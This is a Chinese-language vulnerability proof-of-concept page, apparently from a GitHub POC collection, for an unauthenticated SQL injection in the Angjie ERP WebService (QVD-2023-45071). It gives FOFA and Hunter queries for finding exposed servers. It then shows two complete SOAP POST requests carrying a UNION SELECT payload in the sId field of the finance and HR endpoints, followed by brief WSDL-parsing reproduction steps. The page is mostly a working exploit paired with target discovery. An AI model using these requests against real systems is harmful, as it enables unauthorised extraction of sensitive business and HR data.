## 昂捷ERP-WebService接口-SQL注入漏洞(QVD-2023-45071)
 昂捷ERP WebService接口 存在SQL注入漏洞，未经身份验证的攻击者可以利用该漏洞泄露系统敏感信息。 

## fofa
```
body="CheckSilverlightInstalled"
```

## hunter
```
web.body="CheckSilverlightInstalled"
```

## SQL注入点1 /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx
```
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: xxx.xxx.xxx.xxx:8008
Content-Type: text/xml; 
charset=utf-8
Content-Length: 482

SOAPAction: "http://tempuri.org/GetOSpById"
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetOSpById xmlns="http://tempuri.org/"><sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId></GetOSpById></soap:Body></soap:Envelope>
```

##  SQL注入点2 /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx
```
POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
Host: xxx.xxx.xxx.xxx:8008
Content-Type: text/xml; 
charset=utf-8
Content-Length: 482

SOAPAction: "http://tempuri.org/GetOSpById"
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetOSpById xmlns="http://tempuri.org/"><sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId></GetOSpById></soap:Body></soap:Envelope>
```

## 漏洞复现
访问漏洞点存在的地址

http://xxx.xxx.xxx.xxx:9012/EnjoyRMIS_WS/WS/Hr/CWSHr.asmx

在地址后面加上?wsdl

http://xxx.xxx.xxx.xxx:8123/EnjoyRMIS_WS/WS/Hr/CWSHr.asmx?wsdl

![image](https://github.com/wy876/POC/assets/139549762/a0b95351-845e-49c5-ba1e-8831cf85df9e)

使用wsdler拓展工具解析

![image](https://github.com/wy876/POC/assets/139549762/0537ac47-e89a-41fa-b925-cca83fba75ae)

解析完成之后，即可对这些接口进行测试

![image](https://github.com/wy876/POC/assets/139549762/c1206032-8405-40e4-8ab4-69a68ee22d7f)

